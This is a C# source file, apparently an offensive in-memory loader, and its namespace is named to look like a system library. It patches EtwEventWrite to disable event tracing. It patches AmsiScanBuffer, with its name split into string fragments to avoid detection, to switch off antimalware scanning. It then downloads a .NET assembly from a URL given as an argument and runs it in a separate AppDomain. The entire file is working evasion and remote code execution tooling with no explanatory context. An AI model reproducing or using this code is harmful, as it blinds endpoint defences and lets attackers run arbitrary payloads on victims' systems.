using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace mscorlib
{

    class Program
    {
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
        string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

        public class Worker : MarshalByRefObject
        {
            public void PrintDomain(string url)
            {
                AntiTrace();
                AVNoMo();
                Console.ReadKey();

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                WebClient client = new WebClient();
                byte[] programBytes1 = client.DownloadData(url);
                Assembly dotnetProgram = Assembly.Load(programBytes1);

                object[] parameters = new String[] { null };
                dotnetProgram.EntryPoint.Invoke(null, parameters);
            }
        }

        static byte[] VoodooMagic(string function)
        {
            byte[] patch;
            if (function.ToLower() == "antitrace")
            {

                patch = new byte[2];
                patch[0] = 0xc3;
                patch[1] = 0x00;

                return patch;
            }
            else if (function.ToLower() == "avnomo")
            {

                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xC3;

                return patch;
            }
            else throw new ArgumentException("function is not supported");
        }

        static void AntiTrace()
        {
            string traceloc = "ntdll.dll";
            string magicFunction = "EtwEventWrite";
            IntPtr ntdllAddr = LoadLibrary(traceloc);
            IntPtr traceAddr = GetProcAddress(ntdllAddr, magicFunction);
            byte[] magicVoodoo = VoodooMagic("AntiTrace");
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("no more tracing!");
        }
        static void AVNoMo()
        {
            string avloc = "am" + "si" + ".dll";
            string magicFunction = "Am" + "siSc" + "anB" + "uffer";
            IntPtr avAddr = LoadLibrary(avloc);
            IntPtr traceAddr = GetProcAddress(avAddr, magicFunction);
            byte[] magicVoodoo = VoodooMagic("AvNoMo");
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("no more av");
        }

        static void Main(string[] args)
        {

            AppDomain namek = AppDomain.CreateDomain("Namek");
            Console.WriteLine("Appdomain App Domain created!");
            Worker remoteWorker = (Worker)namek.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            remoteWorker.PrintDomain(args[0]);
            AppDomain.Unload(namek);
            Console.WriteLine("Appdomain Namek deleted!");


        }
    }
}